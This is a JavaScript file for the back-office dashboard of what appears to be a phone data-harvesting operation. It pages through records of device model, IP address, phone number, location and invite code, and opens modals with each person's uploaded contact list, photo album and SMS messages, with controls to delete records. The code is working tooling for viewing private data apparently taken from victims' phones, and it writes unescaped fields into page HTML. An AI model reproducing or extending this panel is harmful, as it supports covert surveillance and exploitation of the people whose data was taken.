let currentPage = 1;
let pageSize = parseInt(localStorage.getItem('pageSize')) || 10;
let favorites = JSON.parse(localStorage.getItem('favorites')) || [];

document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('pageSizeSelect').value = pageSize;
    fetchData();
    updateButtonStates();
    updateFavoritesCount(); // 更新收藏数据总数
});

function fetchData(page = 1) {
    currentPage = page;
    fetch(`/data?page=${page}&pageSize=${pageSize}`)
        .then(response => response.json())
        .then(data => {
            renderData(data.data);
            renderPagination(data.total, data.page, data.pageSize, 'topPagination');
            renderPagination(data.total, data.page, data.pageSize, 'pagination');
            updateButtonStates();
            document.getElementById('totalUsers').textContent = data.total;
        })
        .catch(error => console.error('Error fetching data:', error));
}

function formatDate(dateString) {
    const date = new Date(dateString);
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, '0');
    const day = String(date.getDate()).padStart(2, '0');
    const hours = String(date.getHours()).padStart(2, '0');
    const minutes = String(date.getMinutes()).padStart(2, '0');
    const seconds = String(date.getSeconds()).padStart(2, '0');
    return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
}

function renderData(data) {
    const tbody = document.querySelector('#contactsTable tbody');
    tbody.innerHTML = '';
    data.forEach(item => {
        const row = document.createElement('tr');
        row.innerHTML = `
            <td>
                <div>${formatDate(item.time) || ''}</div>
                <div>${item.inviteCode || ''}</div>
            </td>
            <td>
                <div>${item.deviceModel || ''}</div>
                <div>${item.ipAddress || ''}</div>
            </td>
            <td>${item.phoneNumber || ''}</td>
            <td>${item.relationship || ''}</td>
            <td>${item.currentLocation || ''}</td>
            <td>
                <button onclick="showContactDetails('${item.phoneNumber}')">通讯录</button>
                <button onclick="showAlbum('${item.phoneNumber}')">相册</button>
                <button onclick="showMessages('${item.phoneNumber}')">短信</button>
                <button onclick="toggleFavorite('${item.phoneNumber}', this)">${favorites.includes(item.phoneNumber) ? '已收藏' : '收藏'}</button>
                <button onclick="deleteData('${item.phoneNumber}')">删除</button>
            </td>
        `;
        tbody.appendChild(row);
    });
}

function renderPagination(total, page, pageSize, elementId) {
    const pagination = document.getElementById(elementId);
    pagination.innerHTML = '';
    const totalPages = Math.ceil(total / pageSize);

    const createPageLink = (pageNum, text, isActive = false) => {
        const link = document.createElement('a');
        link.href = '#';
        link.textContent = text;
        link.className = 'pagination-link';
        if (isActive) {
            link.classList.add('active');
        }
        link.onclick = (event) => {
            event.preventDefault();
            fetchData(pageNum);
        };
        return link;
    };

    if (page > 1) {
        pagination.appendChild(createPageLink(page - 1, '«'));
    }

    const startPage = Math.max(1, Math.min(page - 4, totalPages - 9));
    const endPage = Math.min(totalPages, startPage + 9);

    if (startPage > 1) {
        pagination.appendChild(createPageLink(1, '1'));
        if (startPage > 2) {
            const ellipsis = document.createElement('span');
            ellipsis.textContent = '...';
            ellipsis.className = 'pagination-ellipsis';
            pagination.appendChild(ellipsis);
        }
    }

    for (let i = startPage; i <= endPage; i++) {
        pagination.appendChild(createPageLink(i, i, i === page));
    }

    if (endPage < totalPages) {
        if (endPage < totalPages - 1) {
            const ellipsis = document.createElement('span');
            ellipsis.textContent = '...';
            ellipsis.className = 'pagination-ellipsis';
            pagination.appendChild(ellipsis);
        }
        pagination.appendChild(createPageLink(totalPages, totalPages));
    }

    if (page < totalPages) {
        pagination.appendChild(createPageLink(page + 1, '»'));
    }
}

function searchContacts() {
    const searchInput = document.getElementById('searchInput').value.toLowerCase();
    fetch(`/data?page=1&pageSize=1000`)
        .then(response => response.json())
        .then(data => {
            const filteredData = data.data.filter(item => {
                return item.inviteCode.toLowerCase() === searchInput || item.phoneNumber.toLowerCase() === searchInput;
            });
            renderData(filteredData.slice(0, pageSize));
            renderPagination(filteredData.length, 1, pageSize, 'topPagination');
            renderPagination(filteredData.length, 1, pageSize, 'pagination');
        })
        .catch(error => console.error('Error fetching data:', error));
}

function changePageSize() {
    pageSize = parseInt(document.getElementById('pageSizeSelect').value, 10);
    localStorage.setItem('pageSize', pageSize);
    fetchData(1);
}

function showContactDetails(phoneNumber) {
    fetch(`/public/uploads/${phoneNumber}/contacts/contacts.json`)
        .then(response => response.json())
        .then(contacts => {
            const modal = document.createElement('div');
            modal.classList.add('modal');
            modal.innerHTML = `
                <div class="modal-content">
                    <span class="close" onclick="closeModal()">&times;</span>
                    <h2>通讯录详情</h2>
                    <ul>
                        ${contacts.map(contact => `<li>${contact.name}: ${contact.phoneNumber}</li>`).join('')}
                    </ul>
                </div>
            `;
            document.body.appendChild(modal);
            modal.style.display = "block"; // 显示模态框
        })
        .catch(error => console.error('Error fetching contact details:', error));
}

function showAlbum(phoneNumber) {
    fetch(`/getPhotos?phoneNumber=${phoneNumber}`)
        .then(response => response.json())
        .then(data => {
            const modal = document.createElement('div');
            modal.classList.add('modal');
            modal.innerHTML = `
                <div class="modal-content">
                    <span class="close" onclick="closeModal()">&times;</span>
                    <h2>相册详情</h2>
                    <div class="album-photos">
                        ${data.photos.map(photo => `<img src="${photo}" alt="Photo" onclick="enlargePhoto('${photo}')">`).join('')}
                    </div>
                </div>
            `;
            document.body.appendChild(modal);
            modal.style.display = "block"; // 显示模态框
        })
        .catch(error => console.error('Error fetching album details:', error));
}

function showMessages(phoneNumber) {
    fetch(`/getMessages?phoneNumber=${phoneNumber}`)
        .then(response => response.json())
        .then(data => {
            const modal = document.createElement('div');
            modal.classList.add('modal');
            modal.innerHTML = `
                <div class="modal-content">
                    <span class="close" onclick="closeModal()">&times;</span>
                    <h2>短信详情</h2>
                    <ul>
                        ${data.messages.map(message => `<li><strong>${message.date} - ${message.address}:</strong> ${message.body}</li>`).join('')}
                    </ul>
                </div>
            `;
            document.body.appendChild(modal);
            modal.style.display = "block"; // 显示模态框
        })
        .catch(error => console.error('Error fetching messages:', error));
}

function toggleFavorite(phoneNumber, button) {
    const now = new Date().toISOString();
    const existingFavorite = favorites.find(fav => fav.phoneNumber === phoneNumber);

    if (existingFavorite) {
        favorites = favorites.filter(fav => fav.phoneNumber !== phoneNumber);
        button.textContent = '收藏';
        button.classList.remove('favorite-button', 'active');
    } else {
        favorites.push({ phoneNumber, timestamp: now });
        button.textContent = '已收藏';
        button.classList.add('favorite-button', 'active');
    }
    localStorage.setItem('favorites', JSON.stringify(favorites));
    updateButtonStates();
    updateFavoritesCount(); // 更新收藏数据总数
}

function updateButtonStates() {
    document.querySelectorAll('button').forEach(button => {
        if (button.textContent === '收藏' || button.textContent === '已收藏') {
            const phoneNumber = button.getAttribute('onclick').match(/'([^']+)'/)[1];
            const favorite = favorites.find(fav => fav.phoneNumber === phoneNumber);
            if (favorite) {
                button.textContent = '已收藏';
                button.classList.add('favorite-button', 'active');
            } else {
                button.textContent = '收藏';
                button.classList.remove('favorite-button', 'active');
            }
        }
    });
}

function deleteData(phoneNumber) {
    if (confirm("确定要删除此数据吗？")) {
        fetch(`/deleteData?phoneNumber=${phoneNumber}`, {
            method: 'DELETE',
        })
        .then(response => {
            if (response.ok) {
                favorites = favorites.filter(fav => fav.phoneNumber !== phoneNumber); // 删除收藏夹中的数据
                localStorage.setItem('favorites', JSON.stringify(favorites)); // 更新localStorage
                updateFavoritesCount(); // 更新收藏数据总数
                fetchData(currentPage);
            } else {
                alert('删除失败');
            }
        })
        .catch(error => console.error('Error deleting data:', error));
    }
}

function updateFavoritesCount() {
    const totalFavoritesElement = document.getElementById('totalFavorites');
    if (totalFavoritesElement) {
        totalFavoritesElement.textContent = favorites.length;
    }
}

function closeModal() {
    const modal = document.querySelector('.modal');
    if (modal) {
        modal.style.display = "none";
        modal.remove(); // 移除模态框
    }
}

function enlargePhoto(src) {
    const modalPhoto = document.createElement('div');
    modalPhoto.classList.add('modal-photo');
    modalPhoto.innerHTML = `
        <div class="modal-photo-content">
            <span class="close-photo" onclick="closePhotoModal()">&times;</span>
            <img src="${src}" alt="Enlarged Photo">
        </div>
    `;
    document.body.appendChild(modalPhoto);
    modalPhoto.style.display = "block"; // 显示模态框
}

function closePhotoModal() {
    const modalPhoto = document.querySelector('.modal-photo');
    if (modalPhoto) {
        modalPhoto.style.display = "none";
        modalPhoto.remove(); // 移除模态框
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const bulkDeleteBtn = document.getElementById('bulkDeleteBtn');
    const bulkDeleteModal = document.getElementById('bulkDeleteModal');
    const closeModalBtn = document.getElementsByClassName('close')[0];
    const confirmDeleteBtn = document.getElementById('confirmDeleteBtn');

    bulkDeleteBtn.onclick = () => {
        bulkDeleteModal.style.display = 'block';
    }

    closeModalBtn.onclick = () => {
        bulkDeleteModal.style.display = 'none';
    }

    window.onclick = (event) => {
        if (event.target === bulkDeleteModal) {
            bulkDeleteModal.style.display = 'none';
        }
    }

    confirmDeleteBtn.onclick = async () => {
        const deleteDate = document.getElementById('deleteDate').value;
        if (!deleteDate) {
            alert('请选择一个日期');
            return;
        }

        const confirmed = confirm(`确认删除${deleteDate}之前的数据吗？`);
        if (confirmed) {
            try {
                const response = await fetch('/deleteBeforeDate', {
                    method: 'DELETE',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ deleteDate })
                });

                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }

                const result = await response.json();
                alert(result.message);
                bulkDeleteModal.style.display = 'none';
                // 重新加载数据或更新界面
                location.reload();
            } catch (error) {
                console.error('Error deleting data:', error);
                alert('删除数据时出错，请稍后再试');
            }
        }
    }
});
